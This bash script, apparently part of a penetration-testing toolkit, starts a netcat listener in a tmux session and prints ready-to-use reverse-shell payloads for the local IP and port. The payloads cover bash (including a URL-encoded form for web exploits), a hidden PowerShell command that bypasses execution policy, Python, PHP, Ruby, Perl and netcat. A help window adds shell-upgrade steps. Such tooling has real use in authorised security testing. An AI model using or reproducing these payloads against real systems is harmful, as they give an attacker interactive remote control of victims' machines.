#!/bin/bash
# ARGS
# PORT "Netcat listening port"
# SHELL_TYPE "Shell type: bash, sh, or powershell (default: bash)"
# ENDARGS
# AUTHOR: Security Tester
# This script starts an advanced Netcat listener in a tmux session with payload suggestions

# Get arguments
NC_PORT=$1
SHELL_TYPE=${2:-"bash"}

# Define tmux session name
TMUX_SESSION="nc_listener_$NC_PORT"

# Function to display available reverse shell payloads
show_payloads() {
    local ip=$(hostname -I | awk '{print $1}')
    local port=$1
    local shell_type=$2
    
    echo "=========================================================="
    echo "🚀 REVERSE SHELL PAYLOAD EXAMPLES FOR $ip:$port"
    echo "=========================================================="
    
    echo "🐧 Bash one-liner:"
    echo "   bash -i >& /dev/tcp/$ip/$port 0>&1"
    echo
    
    if [[ "$shell_type" == "bash" || "$shell_type" == "sh" ]]; then
        echo "🐧 Bash URL-encoded (for web exploits):"
        echo "   bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$ip%2F$port%200%3E%261%27"
        echo
    fi
    
    if [[ "$shell_type" == "powershell" ]]; then
        echo "🪟 PowerShell:"
        echo "   powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
        echo
    fi
    
    echo "🐍 Python:"
    echo "   python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo
    
    echo "🧪 PHP:"
    echo "   php -r '\$sock=fsockopen(\"$ip\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
    echo
    
    echo "💎 Ruby:"
    echo "   ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",\"$port\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
    echo
    
    echo "🪄 Perl:"
    echo "   perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
    echo
    
    echo "🧰 Netcat:"
    echo "   nc -e /bin/sh $ip $port"
    echo "   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
    echo
    
    echo "=========================================================="
    echo "💡 For more reverse shell payloads, visit: https://revshells.com"
    echo "=========================================================="
}

# Check if the tmux session already exists
if tmux has-session -t $TMUX_SESSION 2>/dev/null; then
    echo "Session $TMUX_SESSION already exists."
    echo "Use 'tmux attach -t $TMUX_SESSION' to interact with the session."
    echo "Or navigate to 'Terminal > Connect to tmux session' in the BSTI UI."
else
    # Display available payloads
    show_payloads $NC_PORT $SHELL_TYPE
    
    echo
    echo "Creating new tmux session named $TMUX_SESSION and starting Netcat listener on port $NC_PORT..."
    
    # Create a tmux session with netcat listener
    if [[ "$SHELL_TYPE" == "powershell" ]]; then
        # For PowerShell targets, use rlwrap for better terminal handling
        tmux new-session -d -s $TMUX_SESSION "echo 'Starting Netcat listener for PowerShell targets...'; if command -v rlwrap >/dev/null 2>&1; then rlwrap nc -lvnp $NC_PORT; else nc -lvnp $NC_PORT; fi"
    else
        # For Unix targets
        tmux new-session -d -s $TMUX_SESSION "echo 'Starting Netcat listener for Unix targets...'; nc -lvnp $NC_PORT"
    fi
    
    echo "Netcat listener started in tmux session $TMUX_SESSION on port $NC_PORT"
    echo "Use 'tmux attach -t $TMUX_SESSION' to interact with the session."
    echo "Or navigate to 'Terminal > Connect to tmux session' in the BSTI UI."
    
    # Add window with help text
    tmux new-window -t $TMUX_SESSION:1 -n "help"
    tmux send-keys -t $TMUX_SESSION:1 "clear; echo '🔄 REVERSE SHELL UPGRADE TECHNIQUES:'; echo; echo '🔹 Python TTY:'; echo '   python -c \"import pty; pty.spawn(\"/bin/bash\")\"'; echo; echo '🔹 Full TTY Experience:'; echo '   1. In reverse shell: python -c \"import pty; pty.spawn(\"/bin/bash\")\"'; echo '   2. Press Ctrl+Z to background'; echo '   3. In local terminal: stty raw -echo; fg'; echo '   4. In reverse shell: export TERM=xterm'; echo; echo '🔹 Press Enter to return to listener'; read" C-m
    
    # Switch back to the main window
    tmux select-window -t $TMUX_SESSION:0
fi 